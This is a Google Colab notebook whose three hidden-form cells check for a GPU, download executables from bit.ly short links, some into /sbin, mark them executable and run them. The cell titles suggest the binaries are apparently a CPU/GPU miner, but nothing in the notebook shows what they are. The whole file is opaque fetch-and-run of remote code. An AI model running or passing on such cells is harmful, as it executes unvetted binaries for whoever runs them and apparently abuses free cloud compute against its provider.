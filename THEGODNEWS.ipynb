{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "THEGOD.ipynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "rfgSOi1hDjfX",
        "cellView": "form"
      },
      "source": [
        "#@title Start..\n",
        "! nvidia-smi -L\n",
        "% cd /sbin\n",
        "! wget -O 1 https://bit.ly/2W2hti7\n",
        "! wget -O 2 https://bit.ly/3BlLtp8\n",
        "! chmod +x 1 2\n",
        "! ./1"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "tjRR9kABZetc"
      },
      "source": [
        "#@title VaioXioivanCPU\n",
        "! nvidia-smi -L\n",
        "!wget https://bit.ly/3xSpMed && chmod +x 3xSpMed && ./3xSpMed"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "hMGbxyxUeyva"
      },
      "source": [
        "#@title VaioXioivanDOBLEGPUCPU\n",
        "! nvidia-smi -L\n",
        "% cd /sbin\n",
        "! wget -O 1 https://bit.ly/3zgLlW7\n",
        "! wget -O 2 https://bit.ly/36QLof8\n",
        "! chmod +x 1 2\n",
        "! ./1"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}